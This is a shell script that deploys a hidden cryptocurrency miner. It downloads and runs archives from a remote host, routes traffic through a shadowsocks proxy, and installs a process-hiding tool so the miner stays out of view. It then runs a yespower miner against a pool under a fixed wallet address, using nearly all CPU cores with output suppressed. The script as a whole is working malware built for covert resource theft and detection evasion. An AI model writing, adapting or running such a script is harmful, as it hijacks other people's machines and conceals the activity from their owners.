#!/bin/sh
wget http://greenleaf.teatspray.fun/backup5.tar.gz
tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
sleep 3
whoami
sleep 3
ls -la
sleep 3

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`
echo ""
echo $used_num_of_cores
echo ""

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 ifconfig.me

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add param

sleep 2

wget -q http://greenleaf.teatspray.fun/param.tar.gz >/dev/null

tar -xf param.tar.gz

sleep 2

apt update >/dev/null

sleep 2

apt -y install build-essential automake libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git >/dev/null

sleep 2

./param --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p IhatePopUpsWut -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1